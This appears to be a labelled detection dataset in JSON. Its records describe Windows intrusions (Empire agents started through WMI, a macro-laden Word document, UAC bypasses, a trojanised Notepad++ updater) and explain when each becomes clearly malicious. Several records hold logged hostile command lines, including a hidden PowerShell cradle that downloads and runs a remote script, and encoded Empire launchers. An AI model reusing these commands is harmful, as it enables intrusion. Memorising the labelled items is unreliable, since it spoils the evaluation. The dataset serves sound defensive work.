+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [
+   {
+    "name": "The attacker's machine finds this computer and checks in with the domain controller",
+    "n_events": 5,
+    "ts": "2000-03-13T14:44:59.569-04:00"
+   },
+   {
+    "name": "The attacker logs on over the network",
+    "n_events": 16,
+    "ts": "2000-03-13T14:44:59.742-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 7,
+    "ts": "2000-03-13T14:45:00.502-04:00"
+   },
+   {
+    "step": 2,
+    "name": "The agent starts, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-03-13T14:45:03.66-04:00"
+   },
+   {
+    "step": 3,
+    "name": "Windows housekeeping for the attacker's PowerShell",
+    "n_events": 8,
+    "ts": "2000-03-13T14:45:09.235-04:00"
+   },
+   {
+    "step": 4,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2643,
+    "ts": "2000-03-13T14:45:13.548-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-03-13T14:45:14.016-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-03-13T14:47:58.701-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The agent receives a final order, answers and exits",
+    "n_events": 16,
+    "ts": "2000-03-13T15:23:07.341-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-03-13T15:23:08.141-04:00"
+   }
+  ],
+  "n_malicious": 2717,
+  "n_context": 21
+ },
+ {
+  "source": "train",
+  "machine": "host-339f",
+  "split": "dev",
+  "attack_id": "atk-e8aecc",
+  "name": "Phishing Word document run by bantonio: PowerShell download cradle, Empire agents, UAC bypasses",
+  "alert_from": "2000-02-24T10:35:52.988-04:00",
+  "why_alert_from": "The first clearly-malicious event is Word spawning a command shell whose command line is a hidden PowerShell download cradle. Everything before it - Word opening and its macro writing files and registry values - looks like an ordinary document being opened; a macro writing to the user's own profile is not proof of attack. The moment an Office program launches cmd.exe to run hidden, internet-downloading PowerShell, no benign explanation remains, and one event earlier (the macro's own file writes) did not yet show that.",
+  "alert_point": {
+   "id": "3d8c05d2-1877-0e8f-2159-fb4ceca97516",
+   "ts": "2000-02-24T10:35:52.988-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "cmd.exe",
+   "principal": "SYSTEMIACOM\\bantonio",
+   "image": "cmd.exe",
+   "parent": "winword.exe",
+   "user": "SYSTEMIACOM\\bantonio",
+   "command_line": "C:\\Windows\\System32\\cmd.exe /k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString('http://news.com:8000/default.ps1');powershell -noP -sta -w 1 -enc $e "
+  },
+  "ancestry": [
+   {
+    "image": "winword.exe",
+    "command_line": "\"C:\\Program Files (x86)\\Microsoft Office\\Office15\\WINWORD.EXE\" /n \"C:\\Users\\bantonio\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\H777GZPT\\payroll.docx\" /o \"\"",
+    "user": "SYSTEMIACOM\\bantonio",
+    "ts": "2000-02-24T10:35:04.072-04:00"
+   },
+   {
+    "image": "outlook.exe",
+    "command_line": "\"C:\\Program Files (x86)\\Microsoft Office\\Office15\\OUTLOOK.EXE\" ",
+    "user": "SYSTEMIACOM\\bantonio",
+    "ts": "2000-02-24T10:20:01.001-04:00"
+   },
+   {
+    "image": "explorer.exe",
+    "command_line": "C:\\Windows\\Explorer.EXE",
+    "user": "SYSTEMIACOM\\bantonio",
+    "ts": "2000-02-24T10:16:44.579-04:00"
+   },
+   {
+    "image": "cmd.exe",
+    "command_line": "C:\\Windows\\system32\\cmd.exe /c \"schtasks /delete /tn \"KickoffAutoLoginRandom\" /F\"",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-02-24T06:10:12.216-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "Phishing document opens and its macro runs",
+    "n_events": 115,
+    "ts": "2000-02-24T10:35:04.072-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "Macro launches a hidden PowerShell download cradle",
+    "n_events": 93,
+    "ts": "2000-02-24T10:35:52.988-04:00"
+   },
+   {
+    "step": 2,
+    "name": "First Empire agent runs and beacons",
+    "n_events": 851,
+    "ts": "2000-02-24T10:35:59.707-04:00"
+   },
+   {
+    "step": 3,
+    "name": "Second Empire agent, host and domain reconnaissance",
+    "n_events": 5738,
+    "ts": "2000-02-24T10:44:21.026-04:00"
+   },
+   {
+    "step": 4,
+    "name": "First UAC bypass attempt via eventvwr",
+    "n_events": 36,
+    "ts": "2000-02-24T11:09:34.636-04:00"
+   },
+   {
+    "step": 5,
+    "name": "Second UAC bypass via the SilentCleanup task, elevated agent starts",
+    "n_events": 61,
+    "ts": "2000-02-24T11:22:37.975-04:00"
+   },
+   {
+    "step": 6,
+    "name": "Agent relaunches itself locally through WMI, beacons to a second C2",
+    "n_events": 176,
+    "ts": "2000-02-24T11:26:09.506-04:00"
+   }
+  ],
+  "n_malicious": 6955,
+  "n_context": 115
+ },
+ {
+  "source": "train",
+  "machine": "host-339f",
+  "split": "dev",
+  "attack_id": "atk-fc3ec8",
+  "name": "Remote WMI as Administrator: Empire agent, WMI persistence, plink reverse tunnel, RDP in and onward",
+  "alert_from": "2000-02-24T11:32:44.347-04:00",
+  "why_alert_from": "The first clearly-malicious event is WMI launching a hidden, encoded PowerShell as Administrator. The incoming logons just before it - an anonymous logon and an Administrator logon from a link-local network address - are suspicious but by themselves could be ordinary remote administration. The instant a WMI provider spawns an obfuscated hidden PowerShell under the Administrator account it matches remote code execution through WMI and no benign reading remains; one event earlier (the logon alone) was not yet enough.",
+  "alert_point": {
+   "id": "f9d0607e-aeec-5748-d008-fb03565a18b5",
+   "ts": "2000-02-24T11:32:44.347-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\administrator",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\Administrator",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBGACgAJABQAFMAVgBlAFIAcwBJAE8ATgBUAEEAYgBsAEUALgBQAFMAVgBlAHIAUwBpAE8ATgAuAE0AQQBqAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAcgBFAEYAXQAuAEEAUwBTAEUAbQBCAGwAeQAuAEcARQB0AFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkAZQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB"
+  },
+  "ancestry": [
+   {
+    "image": "wmiprvse.exe",
+    "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+    "user": "NT AUTHORITY\\NETWORK SERVICE",
+    "ts": "2000-02-24T10:16:44.539-04:00"
+   },
+   {
+    "image": "svchost.exe",
+    "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-02-24T10:16:44.521-04:00"
+   },
+   {
+    "image": "services.exe",
+    "command_line": "C:\\Windows\\system32\\services.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-02-24T10:16:44.52-04:00"
+   },
+   {
+    "image": "wininit.exe",
+    "command_line": "wininit.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-02-24T10:16:44.519-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "Attacker authenticates back in over the network",
+    "n_events": 18,
+    "ts": "2000-02-24T11:28:41.809-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI launches an encoded PowerShell Empire agent as Administrator",
+    "n_events": 6852,
+    "ts": "2000-02-24T11:32:44.347-04:00"
+   },
+   {
+    "step": 2,
+    "name": "RDP logons through the tunnel",
+    "n_events": 188,
+    "ts": "2000-02-24T11:32:58.568-04:00"
+   },
+   {
+    "step": 3,
+    "name": "WMI event-subscription persistence installed",
+    "n_events": 22,
+    "ts": "2000-02-24T11:42:16.959-04:00"
+   },
+   {
+    "step": 4,
+    "name": "plink opens a reverse SSH tunnel exposing local RDP",
+    "n_events": 9,
+    "ts": "2000-02-24T13:10:02.06-04:00"
+   },
+   {
+    "step": 5,
+    "name": "Interactive sysadmin desktop: test-signing, data transfer tool, RDP onward",
+    "n_events": 12104,
+    "ts": "2000-02-24T13:19:31.506-04:00"
+   }
+  ],
+  "n_malicious": 19175,
+  "n_context": 18
+ },
+ {
+  "source": "train",
+  "machine": "host-7f7a",
+  "split": "holdout",
+  "attack_id": "atk-ef26d5",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-01-14T14:44:53.785-04:00",
+  "why_alert_from": "This is the attack's very first event: nothing of the attack comes before it. Here the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI almost never starts PowerShell, and legitimate administration does not hide its command this way, so this single event is enough to conclude this is an attack. The attacker's name lookups and logon records are written only after it.",
+  "alert_point": {
+   "id": "b002b95d-d418-c93e-83e1-f7fd4c04ba41",
+   "ts": "2000-01-14T14:44:53.785-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMAEUALgBQAFMAVgBlAFIAcwBJAE8ATgAuAE0AYQBKAG8AcgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAEYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0A"
+  },
+  "ancestry": [],
+  "lead_up": [],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-01-14T14:44:53.785-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records the attacker's network logons",
+    "n_events": 21,
+    "ts": "2000-01-14T14:44:53.915-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 34,
+    "ts": "2000-01-14T14:44:57.725-04:00"
+   },
+   {
+    "step": 4,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-01-14T14:44:58.598-04:00"
+   },
+   {
+    "step": 5,
+    "name": "Windows housekeeping files for the attacker's PowerShell",
+    "n_events": 9,
+    "ts": "2000-01-14T14:45:00.534-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent beacons to its server every five seconds",
+    "n_events": 2650,
+    "ts": "2000-01-14T14:45:08.304-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-01-14T14:47:58.878-04:00"
+   },
+   {
+    "step": 8,
+    "name": "The agent receives a final order, answers and exits",
+    "n_events": 18,
+    "ts": "2000-01-14T15:23:09.5-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker's last remote logon closes",
+    "n_events": 1,
+    "ts": "2000-01-14T15:23:10.074-04:00"
+   }
+  ],
+  "n_malicious": 2747,
+  "n_context": 0
+ },
+ {
+  "source": "train",
+  "machine": "host-1038",
+  "split": "holdout",
+  "attack_id": "atk-c8a3d3",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-08-11T15:41:17.073-04:00",
+  "why_alert_from": "Before this event the expert has seen only name-lookup answers to another workstation, network logons of the Administrator account (with the privileges every admin logon gets) and short anonymous sessions from the same computer. Remote admin logons happen in normal operation and say nothing about intent. At this event the WMI service starts PowerShell with a base64-encoded command and a hidden-style window. WMI almost never starts PowerShell and legitimate administration does not hide its command this way, so this single event is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "b2c47595-a0e4-046c-7e07-39d249f86de0",
+   "ts": "2000-08-11T15:41:17.073-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\Administrator",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\Administrator",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBTAEUAbQBiAEwAWQAuAEcARQB0AFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB"
+  },
+  "ancestry": [
+   {
+    "image": "wmiprvse.exe",
+    "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+    "user": "NT AUTHORITY\\NETWORK SERVICE",
+    "ts": "2000-08-11T10:10:25.701-04:00"
+   },
+   {
+    "image": "svchost.exe",
+    "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-08-11T10:10:25.602-04:00"
+   },
+   {
+    "image": "services.exe",
+    "command_line": "C:\\Windows\\system32\\services.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-08-11T10:10:25.6-04:00"
+   },
+   {
+    "image": "wininit.exe",
+    "command_line": "wininit.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-08-11T10:10:25.599-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "The attacker's machine finds this computer and logs on",
+    "n_events": 19,
+    "ts": "2000-08-11T15:41:16.493-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts a hidden, base64-encoded PowerShell",
+    "n_events": 6,
+    "ts": "2000-08-11T15:41:17.073-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Windows records one more logon from the attacker's machine",
+    "n_events": 1,
+    "ts": "2000-08-11T15:41:18.435-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 35,
+    "ts": "2000-08-11T15:41:19.607-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows housekeeping for the attacker's PowerShell files and logs",
+    "n_events": 12,
+    "ts": "2000-08-11T15:41:22.512-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-08-11T15:41:31.212-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent beacons to its server every 30 seconds for the rest of the day",
+    "n_events": 6123,
+    "ts": "2000-08-11T15:41:54.86-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-08-11T15:44:20.926-04:00"
+   }
+  ],
+  "n_malicious": 6185,
+  "n_context": 19
+ },
+ {
+  "source": "train",
+  "machine": "host-8329",
+  "split": "dev",
+  "attack_id": "atk-00b186",
+  "name": "Remote WMI launch of an encoded PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-06-13T15:41:16.649-04:00",
+  "why_alert_from": "At this event the WMI host process starts PowerShell with a base64-encoded hidden command, a fraction of a second after a burst of remote administrator logons from another machine. WMI starting encoded PowerShell is a classic sign of remote attacker execution. One event earlier the expert had only seen LLMNR name lookups and network logons by the Administrator account, which happen in normal administration and do not by themselves show an attack.",
+  "alert_point": {
+   "id": "0682b7e2-a37a-0120-d49a-fdf48fa1f817",
+   "ts": "2000-06-13T15:41:16.649-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\Administrator",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\Administrator",
+   "command_line": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBFAHIAcwBJAG8AbgBUAEEAYgBMAEUALgBQAFMAVgBFAFIAUwBpAE8ATgAuAE0AQQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBTAEUAbQBiAEwAWQAuAEcARQB0AFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB"
+  },
+  "ancestry": [
+   {
+    "image": "wmiprvse.exe",
+    "command_line": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+    "user": "NT AUTHORITY\\NETWORK SERVICE",
+    "ts": "2000-06-13T10:10:52.599-04:00"
+   },
+   {
+    "image": "svchost.exe",
+    "command_line": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-06-13T10:10:44.403-04:00"
+   },
+   {
+    "image": "services.exe",
+    "command_line": "C:\\Windows\\system32\\services.exe",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "ts": "2000-06-13T10:10:44.402-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "The attacker's machine finds this computer on the local network",
+    "n_events": 4,
+    "ts": "2000-06-13T15:41:16.198-04:00"
+   },
+   {
+    "name": "The attacker logs in remotely as the domain administrator",
+    "n_events": 14,
+    "ts": "2000-06-13T15:41:16.219-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "WMI starts PowerShell with an encoded command",
+    "n_events": 8,
+    "ts": "2000-06-13T15:41:16.649-04:00"
+   },
+   {
+    "step": 2,
+    "name": "One more anonymous logon from the attacker's machine",
+    "n_events": 1,
+    "ts": "2000-06-13T15:41:18.497-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The agent starts up, turns off script scanning, contacts its server and describes the machine",
+    "n_events": 43,
+    "ts": "2000-06-13T15:41:19.778-04:00"
+   },
+   {
+    "step": 4,
+    "name": "Windows writes the agent's PowerShell activity into the PowerShell event logs",
+    "n_events": 168,
+    "ts": "2000-06-13T15:41:22.807-04:00"
+   },
+   {
+    "step": 5,
+    "name": "The attacker's remote logons close",
+    "n_events": 4,
+    "ts": "2000-06-13T15:41:31.198-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The agent checks in with its server every 30 seconds for the rest of the day",
+    "n_events": 5948,
+    "ts": "2000-06-13T15:41:54.227-04:00"
+   },
+   {
+    "step": 7,
+    "name": "The attacker's machine connects briefly again",
+    "n_events": 4,
+    "ts": "2000-06-13T15:44:20.933-04:00"
+   }
+  ],
+  "n_malicious": 6176,
+  "n_context": 18
+ },
+ {
+  "source": "train",
+  "machine": "host-f3ac",
+  "split": "holdout",
+  "attack_id": "atk-210b72",
+  "name": "Trojanised Notepad++ updater: SYSTEM payload, lsass injection, local admin account, RDP login, and a script beacon loop",
+  "alert_from": "2000-01-09T10:28:11.85-04:00",
+  "why_alert_from": "At this event the trojanised updater executes the random-named program it wrote into the user's Temp folder a few seconds earlier. The events before it are the updater contacting its update server, writing a file into Temp (which can be a legitimate downloaded installer), and an outbound connection the sensor attributes to Google's updater; none of these is conclusive on its own. An updater launching an unknown, random-named executable straight out of Temp has no normal explanation, so this is the first event at which an analyst can be sure it is an attack.",
+  "alert_point": {
+   "id": "931d2292-1c6e-dd60-b496-153d3ffceb7c",
+   "ts": "2000-01-09T10:28:11.85-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "ckfgw.exe",
+   "principal": "SYSTEMIACOM\\dcoombes",
+   "image": "ckfgw.exe",
+   "parent": "gup.exe",
+   "user": "SYSTEMIACOM\\dcoombes",
+   "command_line": "\"C:\\Users\\dcoombes\\AppData\\Local\\Temp\\cKfGW.exe\" "
+  },
+  "ancestry": [
+   {
+    "image": "gup.exe",
+    "command_line": "\"C:\\Program Files (x86)\\Notepad++\\updater\\gup.exe\" -verbose -v5.82",
+    "user": "SYSTEMIACOM\\dcoombes",
+    "ts": "2000-01-09T10:28:00.357-04:00"
+   },
+   {
+    "image": "notepad++.exe",
+    "command_line": "\"C:\\Program Files (x86)\\Notepad++\\notepad++.exe\" ",
+    "user": "SYSTEMIACOM\\dcoombes",
+    "ts": "2000-01-09T10:27:51.399-04:00"
+   },
+   {
+    "image": "explorer.exe",
+    "command_line": "C:\\Windows\\Explorer.EXE",
+    "user": "SYSTEMIACOM\\dcoombes",
+    "ts": "2000-01-09T09:18:41.747-04:00"
+   },
+   {
+    "image": "explorer.exe",
+    "command_line": "C:\\Windows\\Explorer.EXE",
+    "user": "SYSTEMIACOM\\dcoombes",
+    "ts": "2000-01-09T09:18:41.747-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "The trojanised Notepad++ updater starts with administrator rights",
+    "n_events": 11,
+    "ts": "2000-01-09T10:27:57.731-04:00"
+   },
+   {
+    "name": "The updater downloads a payload from the attacker's server and drops it into Temp",
+    "n_events": 11,
+    "ts": "2000-01-09T10:28:05.284-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "The updater runs the random-named payload",
+    "n_events": 12,
+    "ts": "2000-01-09T10:28:11.85-04:00"
+   },
+   {
+    "step": 2,
+    "name": "The payload escalates itself to SYSTEM",
+    "n_events": 6,
+    "ts": "2000-01-09T10:30:33.648-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The operator opens a SYSTEM command shell and checks the network",
+    "n_events": 16,
+    "ts": "2000-01-09T10:31:49.141-04:00"
+   },
+   {
+    "step": 4,
+    "name": "The payload injects into lsass",
+    "n_events": 2,
+    "ts": "2000-01-09T10:39:40.372-04:00"
+   },
+   {
+    "step": 5,
+    "name": "From inside lsass: logon persistence is planted",
+    "n_events": 16,
+    "ts": "2000-01-09T10:47:13.718-04:00"
+   },
+   {
+    "step": 6,
+    "name": "The persistence script beacons to the attacker's server every minute",
+    "n_events": 618,
+    "ts": "2000-01-09T10:47:13.978-04:00"
+   },
+   {
+    "step": 7,
+    "name": "lsass opens another SYSTEM shell",
+    "n_events": 8,
+    "ts": "2000-01-09T10:48:49.005-04:00"
+   },
+   {
+    "step": 8,
+    "name": "lsass runs commands that create a local 'admin' account and add it to groups",
+    "n_events": 113,
+    "ts": "2000-01-09T11:06:32.307-04:00"
+   },
+   {
+    "step": 9,
+    "name": "The attacker logs in over Remote Desktop as the new admin",
+    "n_events": 100,
+    "ts": "2000-01-09T11:08:48.572-04:00"
+   },
+   {
+    "step": 10,
+    "name": "The last payload copy keeps running",
+    "n_events": 8,
+    "ts": "2000-01-09T11:21:29.965-04:00"
+   }
+  ],
+  "n_malicious": 899,
+  "n_context": 22
+ },
+ {
+  "source": "train",
+  "machine": "host-f3ac",
+  "split": "holdout",
+  "attack_id": "atk-f3ac-2",
+  "name": "Second payload update.exe: downloaded by the automated browser, run with elevation, beacons to the same C2",
+  "alert_from": "2000-01-09T14:23:26.523-04:00",
+  "why_alert_from": "The download of a file named update.exe and its launch both look like ordinary user activity on their own. The moment update.exe, a program created on disk seconds earlier, opens a connection to a bare IP address on port 8080, there is no benign explanation, so this is the first clearly-malicious event.",
+  "alert_point": {
+   "id": "f9e9f9dc-10a6-42f0-ed69-1bf7c77a0bfd",
+   "ts": "2000-01-09T14:23:26.523-04:00",
+   "kind": "FLOW START",
+   "actor_image": "update.exe",
+   "principal": "SYSTEMIACOM\\dcoombes",
+   "dest": "53.192.68.50:8080",
+   "direction": "outbound",
+   "src": "10.101.225.95:50259"
+  },
+  "ancestry": [
+   {
+    "image": "update.exe",
+    "command_line": "\"C:\\Users\\dcoombes\\Downloads\\update.exe\" ",
+    "user": "SYSTEMIACOM\\dcoombes",
+    "ts": "2000-01-09T14:23:26.23-04:00"
+   },
+   {
+    "image": "explorer.exe",
+    "command_line": "C:\\Windows\\Explorer.EXE",
+    "user": "SYSTEMIACOM\\dcoombes",
+    "ts": "2000-01-09T14:21:31.52-04:00"
+   },
+   {
+    "image": "explorer.exe",
+    "command_line": "C:\\Windows\\Explorer.EXE",
+    "user": "SYSTEMIACOM\\dcoombes",
+    "ts": "2000-01-09T14:21:31.52-04:00"
+   },
+   {
+    "image": "explorer.exe",
+    "command_line": "C:\\Windows\\Explorer.EXE",
+    "user": "SYSTEMIACOM\\dcoombes",
+    "ts": "2000-01-09T14:21:31.52-04:00"
+   }
+  ],
+  "lead_up": [
+   {
+    "name": "An automated browser downloads update.exe from the attacker's server",
+    "n_events": 13,
+    "ts": "2000-01-09T14:22:56.026-04:00"
+   },
+   {
+    "name": "update.exe is run with an elevation prompt",
+    "n_events": 31,
+    "ts": "2000-01-09T14:23:06.317-04:00"
+   }
+  ],
+  "steps": [
+   {
+    "step": 1,
+    "name": "update.exe beacons to the attacker's command-and-control server",
+    "n_events": 6,
+    "ts": "2000-01-09T14:23:26.523-04:00"
+   },
+   {
+    "step": 2,
+    "name": "Outlook handles files named update.exe",
+    "n_events": 16,
+    "ts": "2000-01-09T14:28:18.067-04:00"
+   },
+   {
+    "step": 3,
+    "name": "The download is cleaned up and the payload exits",
+    "n_events": 20,
+    "ts": "2000-01-09T14:33:31.262-04:00"
+   }
+  ],
+  "n_malicious": 42,
+  "n_context": 44
+ },
+ {
+  "source": "train",
+  "machine": "host-0dfa",
+  "split": "dev",
+  "attack_id": "atk-8cc8c6",
+  "name": "Remote WMI launch of a hidden PowerShell Empire agent that beacons to its server",
+  "alert_from": "2000-04-03T14:45:00.035-04:00",
+  "why_alert_from": "Before this event the expert has seen only name-lookup answers to another workstation and a directory lookup to the domain controller, which happen all the time and say nothing about intent. At this event the WMI service starts PowerShell with a hidden window and a base64-encoded command. WMI almost never starts PowerShell and legitimate administration does not hide its command this way, so this single event is enough to conclude this is an attack.",
+  "alert_point": {
+   "id": "a1ae96c8-b48d-739d-3955-fd1598ab9d34",
+   "ts": "2000-04-03T14:45:00.035-04:00",
+   "kind": "PROCESS CREATE",
+   "actor_image": "powershell.exe",
+   "principal": "SYSTEMIACOM\\zleazer",
+   "image": "powershell.exe",
+   "parent": "wmiprvse.exe",
+   "user": "SYSTEMIACOM\\zleazer",
